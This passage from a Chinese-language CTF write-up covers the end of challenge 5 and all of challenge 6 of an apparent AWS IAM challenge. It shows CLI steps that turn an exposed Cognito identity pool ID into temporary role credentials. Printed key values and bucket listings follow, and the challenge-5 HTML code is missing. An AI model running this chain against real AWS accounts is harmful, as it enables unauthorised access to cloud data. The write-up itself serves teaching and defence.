    Cognito JavaScript SDK Example
```
使用浏览器打开这个 HTML 文件，在 Console 中可以看到输出了一行地址。
访问它，就可以看到存储桶里的对象被列出了。
这里可以得知 FLAG 的 Key 是 flag1.txt，然后把代码修改下，改成读这个对象。
```html
    Cognito JavaScript SDK Example
```
用浏览器打开这段 HTML，复制打开 Console 中的链接，就可以得到 FLAG 了。
在这题里，可以得知，平时应该保护好自己的身份池 ID，另外身份池类型有不允许匿名访问和允许匿名访问这两种，在创建身份池的时候，我们应该选择使用不允许匿名访问的。
如果设置了不允许匿名访问，那么我们在匿名访问的情况下去调用它的话，就会提示未授权访问，而不是直接生成临时令牌了。
## 6. One final push
第 6 题，也是最后一题，这题叫 One final push，题目内容是：“匿名访问已被禁止，现在看看你能做什么，现在尝试使用经过身份验证的角色：
arn:aws:iam::092297851374:role/Cognito_s3accessAuth_Role”，题目给出的 Policy 如下：
```json
{
    "Version": "2012-10-17",
    "Statement": [
        {
            "Effect": "Allow",
            "Principal": {
                "Federated": "cognito-identity.amazonaws.com"
            },
            "Action": "sts:AssumeRoleWithWebIdentity",
            "Condition": {
                "StringEquals": {
                    "cognito-identity.amazonaws.com:aud": "us-east-1:b73cb2d2-0d00-4e77-8e80-f99d9c13da3b"
                }
            }
        }
    ]
}
```
可以看到，这题其实是上一道题的延伸，身份池 ID 都是一样的。
在 Policy 的 Action 中有个利用 AssumeRoleWithWebIdentity 生成 STS 的行为。
通过查看官方文档可以知道，想利用 AssumeRoleWithWebIdentity 生成 STS 需要知道三个东西。
```bash
> aws sts assume-role-with-web-identity help
--role-arn 
--role-session-name 
--web-identity-token 
```
其中 role-arn 题目已经给我们了，role-session-name 我们自己随便起一个就行，那么最后剩下的就是 web-identity-token 了。
根据官方文档和询问 ChatGPT，web-identity-token 可以通过身份池 ID 去获得，而且生成 Token 的相关接口都是公开的，可以被直接调用，不需要授权。
要获取 Token，首先我们需要用这个身份池 ID 获取到它的身份 ID。
```bash
> aws cognito-identity get-id --identity-pool-id us-east-1:b73cb2d2-0d00-4e77-8e80-f99d9c13da3b
{
    "IdentityId": "us-east-1:453cea83-a2c0-4b64-a7ff-9dc3783701db"
}
```
然后使用这个身份 ID 获取 Token，这个接口也是公共接口，不需要任何权限。
```bash
> aws cognito-identity get-open-id-token --identity-id us-east-1:453cea83-a2c0-4b64-a7ff-9dc3783701db
{
    "IdentityId": "us-east-1:453cea83-a2c0-4b64-a7ff-9dc3783701db",
    "Token": "eyJraWQiOiJ1cy1lYXN0Lxxxx..."
}
```
最后利用上述信息，就可以调用 assume-role-with-web-identity 生成一个 STS 了。
```bash
> aws sts assume-role-with-web-identity --role-arn arn:aws:iam::092297851374:role/Cognito_s3accessAuth_Role --role-session-name teamssix --web-identity-token eyJraWQiOiJ1cy1lYXN0LTEzIiwidHlwIjoi...
{
    "Credentials": {
        "AccessKeyId": "ASIARK7LBOHXDFQ6KRE3",
        "SecretAccessKey": "Wqk43MfgwPM5F7Z9IfFgv24RwHuCVDh8M0swTUyj",
        "SessionToken": "IQoJb3JpZ2luX2VjEND...",
        "Expiration": "2023-07-06T16:36:18+00:00"
    },
    "SubjectFromWebIdentityToken": "us-east-1:453cea83-a2c0-4b64-a7ff-9dc3783701db",
    "AssumedRoleUser": {
        "AssumedRoleId": "AROARK7LBOHXASFTNOIZG:teamssix",
        "Arn": "arn:aws:sts::092297851374:assumed-role/Cognito_s3accessAuth_Role/teamssix"
    },
    "Provider": "cognito-identity.amazonaws.com",
    "Audience": "us-east-1:b73cb2d2-0d00-4e77-8e80-f99d9c13da3b"
}
```
最后使用环境变量配置这个 STS。
```bash
> export AWS_ACCESS_KEY_ID=ASIARK7LBOHXDFQ6KRE3
> export AWS_SECRET_ACCESS_KEY=Wqk43MfgwPM5F7Z9IfFgv24RwHuCVDh8M0swTUyj
> export AWS_SESSION_TOKEN=IQoJb3JpZ2luX2VjEND...
```
然后列下当前存储桶，其实这些存储桶就是上面所有题里用到的存储桶。
```bash
> aws s3 ls
2023-06-05 01:07:29 tbic-wiz-analytics-bucket-b44867f
2023-06-05 21:07:44 thebigiamchallenge-admin-storage-abf1321
2023-06-05 00:31:02 thebigiamchallenge-storage-9979f4b
2023-06-05 21:28:31 wiz-privatefiles
2023-06-05 21:28:31 wiz-privatefiles-x1000
```
最后，在 wiz-privatefiles-x1000 存储桶下找到 FLAG 文件。
```bash
aws s3api get-object --bucket wiz-privatefiles-x1000 --key flag2.txt flag2.txt
```
结束，拿到最后一个 FLAG。
到这里，其实可以得到一个结论，就是在拿到身份池 ID 以及所对应的角色 ARN 时，通过这两条信息，可以获取到对应角色的权限，因此平时应该注意，不要将这些信息泄露。
最后，通过上面这 6 道题，个人觉着还是能学习到不少东西的，在整个过程中需要查阅大量的官方文档，ChatGPT 也是个很好的辅助工具，另外这里也参考了一些其他人的 WP，我所参考的资料都放在参考链接了，在你去做这个 IAM 挑战赛的时候，以上内容或许可以帮助到你。
> 参考链接：
>
> 1. [https://docs.aws.amazon.com/zh_cn/AWSSimpleQueueService/latest/SQSDeveloperGuide/welcome.html](https://docs.aws.amazon.com/zh_cn/AWSSimpleQueueService/latest/SQSDeveloperGuide/welcome.html)
> 2. [https://docs.aws.amazon.com/cli/latest/reference/sqs/receive-message.html](https://docs.aws.amazon.com/cli/latest/reference/sqs/receive-message.html)
> 3. [https://docs.aws.amazon.com/zh_cn/sns/latest/dg/welcome.html](https://docs.aws.amazon.com/zh_cn/sns/latest/dg/welcome.html)
> 4. [https://docs.aws.amazon.com/cli/latest/reference/sns/subscribe.html](https://docs.aws.amazon.com/cli/latest/reference/sns/subscribe.html)
> 5. [https://docs.aws.amazon.com/cli/latest/reference/sns/confirm-subscription.html](https://docs.aws.amazon.com/cli/latest/reference/sns/confirm-subscription.html)
> 6. [https://docs.aws.amazon.com/zh_cn/IAM/latest/UserGuide/reference_policies_multi-value-conditions.html#reference_policies_multi-key-or-value-conditions](https://docs.aws.amazon.com/zh_cn/IAM/latest/UserGuide/reference_policies_multi-value-conditions.html#reference_policies_multi-key-or-value-conditions)
> 7. [https://docs.aws.amazon.com/zh_cn/cognito/latest/developerguide/getting-started-with-identity-pools.html](https://docs.aws.amazon.com/zh_cn/cognito/latest/developerguide/getting-started-with-identity-pools.html)
> 8. [https://docs.aws.amazon.com/cli/latest/reference/cognito-identity/get-id.html](https://docs.aws.amazon.com/cli/latest/reference/cognito-identity/get-id.html)
> 9. [https://docs.aws.amazon.com/cli/latest/reference/cognito-identity/get-open-id-token.html](https://docs.aws.amazon.com/cli/latest/reference/cognito-identity/get-open-id-token.html)
> 10. [https://docs.aws.amazon.com/cli/latest/reference/sts/assume-role-with-web-identity.html](https://docs.aws.amazon.com/cli/latest/reference/sts/assume-role-with-web-identity.html)
> 11. [https://medium.com/@ayush.guha/ctf-thebigiamchallenge-walkthrough-534d727eb0d8](https://medium.com/@ayush.guha/ctf-thebigiamchallenge-walkthrough-534d727eb0d8)
> 12. [https://zhuanlan.zhihu.com/p/640694595](https://zhuanlan.zhihu.com/p/640694595)